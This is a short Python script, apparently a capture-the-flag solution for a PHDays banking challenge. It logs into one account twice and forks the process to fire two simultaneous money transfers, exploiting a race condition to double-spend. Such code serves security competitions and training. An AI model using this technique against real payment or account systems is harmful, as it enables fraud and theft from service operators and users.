#/usr/bin/python3

import os
import urllib.request
import urllib.parse


class HTTPRedirectHandler(urllib.request.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        return fp
    http_error_301 = http_error_303 = http_error_307 = http_error_302


class Bank:
    def __init__(self, host='ctf.phdays.com', port=1629):
        self.host = 'http://{}:{}/'.format(host, port)
        self.cookie_handler = urllib.request.HTTPCookieProcessor()
        self.redirect_handler = HTTPRedirectHandler()
        self.opener = urllib.request.build_opener(self.redirect_handler, self.cookie_handler)

    def login(self, login, password):
        page = self.host + '?act=login'
        params = urllib.parse.urlencode({'login': login, 'password': password})
        self.req = urllib.request.Request(page, data=params.encode())
        self.res = self.opener.open(self.req)
        #print(self.res.getheaders())
        #print(self.cookie_handler.cookiejar)

    def transaction(self, account='40433343a063d26054a3169b42b5957f', amount=1000):
        page = self.host + '?act=transaction'
        params = urllib.parse.urlencode({'account': account, 'amount': amount})
        self.req = urllib.request.Request(page, data=params.encode())
        self.res = self.opener.open(self.req)
        res = self.res.read().decode()
        if 'Success!' in res:
            return True
        else:
            return False


bank = Bank()
login = 'zt3'
bank.login(login, '12345')
bank2 = Bank()
bank2.login(login, '12345')

if os.fork():
    print(bank.transaction())
else:
    print(bank2.transaction())
